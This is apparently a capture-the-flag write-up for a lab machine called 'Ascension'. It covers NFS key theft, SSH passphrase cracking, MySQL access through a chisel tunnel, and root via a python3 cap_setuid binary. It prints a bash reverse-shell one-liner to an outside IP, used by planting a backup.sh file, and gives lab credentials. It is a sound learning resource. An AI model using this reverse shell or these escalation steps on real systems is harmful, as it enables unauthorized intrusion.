# Ascension — (Tools : NFSSHARE / PSPY )

# ENUMERATION :

Nmap Scan:

![ascension screenshot 1](images/ascension/ascension-01.png)

Interesting ports that catch the eye :

- NFS — possible share mounting

- HTTP

- FTP — if anon enabled

Let’s run the -sVC scan to see what’s going on

![ascension screenshot 2](images/ascension/ascension-02.png)

![ascension screenshot 3](images/ascension/ascension-03.png)

FTP has anonymous login allowed, whereas nfs has not been listed.

## FTP ENUMERATION

Let’s enumerate it manually.

![ascension screenshot 4](images/ascension/ascension-04.png)

![ascension screenshot 5](images/ascension/ascension-05.png)

Seems to be a password wordlists.

## HTTP ENUMERATION

![ascension screenshot 6](images/ascension/ascension-06.png)

Port 80 is hosting Apache2.

Let’s run a dirsearch to look for extensions like .php, .txt

![ascension screenshot 7](images/ascension/ascension-07.png)

From a first glance, we can see that it’s a Wordpress page

But we still cannot find the homepage.

Let’s try to add the *.html extension too

![ascension screenshot 8](images/ascension/ascension-08.png)

Changing the wordlists we found an index.php , with error 500.

Trying to open it on the web:

![ascension screenshot 9](images/ascension/ascension-09.png)

Blank Page.

Can we run a WPScan?

![ascension screenshot 10](images/ascension/ascension-10.png)

We cannot.

So how to proceed?

Maybe fuzzing directories with /seclists/wp-fuzzing lists?

![ascension screenshot 11](images/ascension/ascension-11.png)

We find a big list of wp-admin, wp-includes dirs.

Checking /index.html , we can find that is the current page exposed:

![ascension screenshot 12](images/ascension/ascension-12.png)

Something that I didnt know, was the --force flag in WPScan.

A nice dirsearcher that I found is FEROXBUSTER

https://github.com/epi052/feroxbuster

Let’s try it out :

![ascension screenshot 13](images/ascension/ascension-13.png)

And indeed it works!

![ascension screenshot 14](images/ascension/ascension-14.png)

Unfortunately we found nothing.

## NFS ENUMERATION

Let’s move to NFS. We enumerate it manually

![ascension screenshot 15](images/ascension/ascension-15.png)

/srv/info/user1 *

What is it?

Let’s try to mount it

![ascension screenshot 16](images/ascension/ascension-16.png)

![ascension screenshot 17](images/ascension/ascension-17.png)

id_rsa and id_rsa.pub

![ascension screenshot 18](images/ascension/ascension-18.png)

From id_rsa.pub we can retrieve the name of the user.

In this case is : user1.

Well, we can now try to SSH :

1. Copy the id_rsa in another dir

![ascension screenshot 19](images/ascension/ascension-19.png)

1. Change permissions

![ascension screenshot 20](images/ascension/ascension-20.png)

1. Try to SSH

![ascension screenshot 21](images/ascension/ascension-21.png)

It asks for a passphrase.

What we need here is ssh2john to extract the passphrase and crack it with JohnTheRipper.

- Extract the passphrase ssh2john

![ascension screenshot 22](images/ascension/ascension-22.png)

- Cracking with JohnTheRipper.  Maybe we should use the pwlist found in FTP?   Let’s try it.

![ascension screenshot 23](images/ascension/ascension-23.png)

Unsuccessful.

- Let’s try with rockyou

![ascension screenshot 24](images/ascension/ascension-24.png)

This will be incredibly long.

# INITAL ACCESS AS USER1

Hacktricks talks about a tool NFSSHELL, which could be used to directly interact with the nfs share without mounting it on the system, and to change UID and GID.

https://hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html

Let’s give it a try.

https://github.com/Supermathie/nfsshell

First we install dependencies

![ascension screenshot 25](images/ascension/ascension-25.png)

Then clone it :

![ascension screenshot 26](images/ascension/ascension-26.png)

Then make It :

![ascension screenshot 27](images/ascension/ascension-27.png)

We got an error.

Browsing the error we figure it out that it’s a matter of old C code incompatible with recent GCC.

To solve it:

We copy the nsfhell.c in nfshell.c.bak

Then we modify this way :

![ascension screenshot 28](images/ascension/ascension-28.png)

After that, we have to modify the line 2191

![ascension screenshot 29](images/ascension/ascension-29.png)

`dircmp(char **p, char **q)`

In :

![ascension screenshot 30](images/ascension/ascension-30.png)

Then we make again :

![ascension screenshot 31](images/ascension/ascension-31.png)

And here we are.

Let’s run it :

![ascension screenshot 32](images/ascension/ascension-32.png)

From the menu we can see that we have to run host <host>

I found a great article talking about nfsshell

https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/

According to that,

We can check the permissions required in the directory to modify or put files, setting UID e GID accordingly, and proceed.

Moreover, it’s strictly recommended to run nfsshare as root.

Let’s try it out :

1. List the shares with “export”

![ascension screenshot 33](images/ascension/ascension-33.png)

1. Mount the shares with mount :

![ascension screenshot 34](images/ascension/ascension-34.png)

1. Check the UID & GID required with “ls -l”

![ascension screenshot 35](images/ascension/ascension-35.png)

According to the output we need UID 1001 and GID 1001.

1. Set UID and GID accordingly

![ascension screenshot 36](images/ascension/ascension-36.png)

1. Now try to upload a simple test.txt to see if it’s working

![ascension screenshot 37](images/ascension/ascension-37.png)

And we have WRITE PERMISSIONS !

What if we upload an SSH pair so that we can try to login?

1. Create an SSH pair with ssh-keygen

![ascension screenshot 38](images/ascension/ascension-38.png)

![ascension screenshot 39](images/ascension/ascension-39.png)

1. Change privs to 600

![ascension screenshot 40](images/ascension/ascension-40.png)

1. We transfer user1.pub in the share and user1 in our /.ssh/authorized_keys

![ascension screenshot 41](images/ascension/ascension-41.png)

![ascension screenshot 42](images/ascension/ascension-42.png)

1. Try to SSH

![ascension screenshot 43](images/ascension/ascension-43.png)

Should I change privs to publickey too?

Running SSH verbosely, is simply the fact that SSH on the other side does not accept the public key.

And now I can understand, ‘cos we ‘re not working in to /.ssh directory, but in an /srv/nfs/user1 directory.

What we did till now is useless.

At this point I think that the only way is being able to crack the passphrase of id_rsa.

But why ain’t I able to do it?

Let’s start again.

Download the id_rsa, ssh2john and crack it with John :

![ascension screenshot 44](images/ascension/ascension-44.png)

Waiting again…

![ascension screenshot 45](images/ascension/ascension-45.png)

It took 20 minutes, but we got a password.

`Sammie1 `

Try to SSH to have a shell as user1

![ascension screenshot 46](images/ascension/ascension-46.png)

We’re in.

![ascension screenshot 47](images/ascension/ascension-47.png)

We got all accesses denied

I think that now we can try to find the flag1

![ascension screenshot 48](images/ascension/ascension-48.png)

We found the flag 1 in /opt/user1

![ascension screenshot 49](images/ascension/ascension-49.png)

I suppose that we have to move laterally to user2 or someone else.

We could now check sudo -l and SUID binaries , and getcap too

![ascension screenshot 50](images/ascension/ascension-50.png)

Can’t check sudo -l

![ascension screenshot 51](images/ascension/ascension-51.png)

We can check on GTFO Bins if we can exploit one of them, even if I don’t think so

For now no exploits on GTFO Bins

Let’s check /srv directory

![ascension screenshot 52](images/ascension/ascension-52.png)

And maybe /var dir

![ascension screenshot 53](images/ascension/ascension-53.png)

Interesting db creds.

Is there a db then running then?

Let’s run linpeas.sh

![ascension screenshot 54](images/ascension/ascension-54.png)

Not working?

Let’s try LinEnum.sh

![ascension screenshot 55](images/ascension/ascension-55.png)

Mmh, let’s check the sysinfo

![ascension screenshot 56](images/ascension/ascension-56.png)

Now we can download the version for amd64

![ascension screenshot 57](images/ascension/ascension-57.png)

Now it’s bugging

Let’s run the last tools unix-privesc-check

![ascension screenshot 58](images/ascension/ascension-58.png)

In standard mode

![ascension screenshot 59](images/ascension/ascension-59.png)

## MANUAL ENUMERATION

- Let’s go for manual crontab

![ascension screenshot 60](images/ascension/ascension-60.png)

No crontab

We still have a pwlist.txt

What is it for?

- Writable directories

![ascension screenshot 61](images/ascension/ascension-61.png)

Mhhh

- Internal ports

![ascension screenshot 62](images/ascension/ascension-62.png)

We can see that there is MSQL 3306 running.

Maybe we can forward the port using chisel and try to access

# ACCESS AS USER3

- Chisel

![ascension screenshot 63](images/ascension/ascension-63.png)

![ascension screenshot 64](images/ascension/ascension-64.png)

Now that it’s connected, let’s try to access the db with mysql with credentials found previously

User : wpuser

Password : wppassword

![ascension screenshot 65](images/ascension/ascension-65.png)

![ascension screenshot 66](images/ascension/ascension-66.png)

![ascension screenshot 67](images/ascension/ascension-67.png)

Interesting tables.

Let’s inspect them with “describe” first

![ascension screenshot 68](images/ascension/ascension-68.png)

![ascension screenshot 69](images/ascension/ascension-69.png)

Is it the second one?

![ascension screenshot 70](images/ascension/ascension-70.png)

Well, it’s the fourth one ahaha.

Good btw

Let’s go for users

![ascension screenshot 71](images/ascension/ascension-71.png)

We got user3 with its password.

Let’s login

![ascension screenshot 72](images/ascension/ascension-72.png)

In its home directory we have python3 executable. Weird. Let’s keep it in mind.

![ascension screenshot 73](images/ascension/ascension-73.png)

- Sudo -l

![ascension screenshot 74](images/ascension/ascension-74.png)

We can’t run sudo.

- Crontab?

![ascension screenshot 75](images/ascension/ascension-75.png)

- Any SUIDs?

![ascension screenshot 76](images/ascension/ascension-76.png)

Nothing

- Writable directories?

![ascension screenshot 77](images/ascension/ascension-77.png)

![ascension screenshot 78](images/ascension/ascension-78.png)

Flag 5 found in /opt

- Rechecking internal ports to see if we missed something

![ascension screenshot 79](images/ascension/ascension-79.png)

Maybe missed another port : 33060

That should be another database?

Let’s go ahead and forward again the port as did before.

![ascension screenshot 80](images/ascension/ascension-80.png)

When connecting

![ascension screenshot 81](images/ascension/ascension-81.png)

So maybe this is something linked to our pwlist.txt?

![ascension screenshot 82](images/ascension/ascension-82.png)

Trying to brute force, something’s wrong.

Let’s browse the error and see what’s going on

Even when trying to connect in the SSH session, there is a protocol mismatch.

![ascension screenshot 83](images/ascension/ascension-83.png)

Browsing port 3360:

![ascension screenshot 84](images/ascension/ascension-84.png)

Well, so that’s definitely  not the way

So what’s the path again?

# ACCESS AS USER2

Let’s do a step backward and let’s enumerate more.

- What are the processes running?

We could run pspy to check for processes:

https://github.com/DominicBreuker/pspy

![ascension screenshot 85](images/ascension/ascension-85.png)

We can see that there is a backup.sh running in /tmp

Bingo!

Let’s go checking

![ascension screenshot 86](images/ascension/ascension-86.png)

There is nothing.

BUT,

If we can place a payload called backup.sh, it will be called and we would have a reverse shell.

Let’s try it :

We can use a simple bash one liner :

`Bash -c “bash -i >& /dev/tcp/10.200.70.82/1234 0>&1” `

We echo it into something called backup.sh, we startup a listener and we wait

![ascension screenshot 87](images/ascension/ascension-87.png)

![ascension screenshot 88](images/ascension/ascension-88.png)

![ascension screenshot 89](images/ascension/ascension-89.png)

We’re in as user 2

Let’s check the flag in /opt.

Now we have to understand how to move to ftpuser or root.

Enumerating sudo -l == password is required.

Enumerating SUIDs == nothing interesting

Enumerating cronjobs == just backup.sh

Enumerating getcap == nothing.

But normally, the lateral movement should be done from user 1 to user 3.

Since we already pwned user3, maybe the movement to ftpuser or root starts from user3.

Let’s go again to user3 and start enumerating again.

Something is missing.

![ascension screenshot 90](images/ascension/ascension-90.png)

As previously seen, in user3’s home, there is a python3 binary.

Weird.

What is it for?

![ascension screenshot 91](images/ascension/ascension-91.png)

Running getcap -r we have no output.

- Let’s try to check this python3 capabilities

- /usr/sbin/getcap python3

![ascension screenshot 92](images/ascension/ascension-92.png)

It has cap_setuid=ep enabled!

This means that we could have a root shell, pwning the entire system

- Let’s check on GTFO Bins to see how to exploit it:

![ascension screenshot 93](images/ascension/ascension-93.png)

And running the command:

![ascension screenshot 94](images/ascension/ascension-94.png)

# Pwned.
